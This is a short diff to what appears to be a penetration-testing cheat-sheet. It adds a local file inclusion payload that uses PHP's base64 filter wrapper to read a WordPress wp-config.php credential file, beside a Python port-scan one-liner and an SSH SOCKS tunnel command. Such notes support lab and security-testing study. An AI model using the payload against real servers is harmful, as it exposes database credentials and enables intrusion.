@@ -81,3 +81,7 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 ## Dynamic tunnel
 Over Socks 5: ssh -D PORT [USER]@[IP]
 ![image](https://github.com/user-attachments/assets/bb6c4651-ac44-4144-9765-845565b9a826)
+
+## Force the server to read and encode the file before processed
+Example (with LFI, wp file) 
+http://[IP]/lx.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
